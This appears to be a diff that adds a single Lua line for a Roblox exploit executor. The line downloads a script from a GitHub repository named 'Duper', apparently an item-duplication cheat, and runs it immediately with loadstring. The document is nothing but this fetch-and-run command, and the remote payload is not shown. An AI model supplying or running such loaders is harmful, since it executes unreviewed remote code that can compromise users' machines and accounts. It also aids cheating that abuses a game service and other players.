@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/skssmalw/Duper/refs/heads/main/main"))()
